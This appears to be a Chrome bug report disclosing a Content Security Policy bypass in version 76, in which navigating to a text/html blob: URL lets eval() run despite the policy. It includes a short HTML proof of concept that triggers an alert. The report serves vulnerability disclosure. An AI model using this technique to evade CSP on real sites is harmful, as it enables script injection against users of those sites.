VULNERABILITY DETAILS
When setting a CSP that allows blob: URIs, creating a blob: of type "text/html" and then navigating to that blob removes the CSP restrictions with script-src 'unsafe-inline'. That means an eval() call can been executed.Just like https://crbug.com/chromium/905301.
VERSION
Chrome Version: [76.0.3809.87] + [stable]
Operating System: [Windows10 1903]
REPRODUCTION CASE
When navigating to the blob, the eval() function in the blob gets executed.
This security feature is worked in Firefox/MicrosoftEdge(Dev).
POC:
<head>  
    <meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline' ">  
</head>  
  
<body>  
    <script>  
        let blob = new Blob([`  
        <script>      
        eval('alert(location.href)');  
        <\/script>  
    `], {  
            type: "text/html"  
        });  
        let url = URL.createObjectURL(blob);  
        location.href = url  
    </script>  
</body>
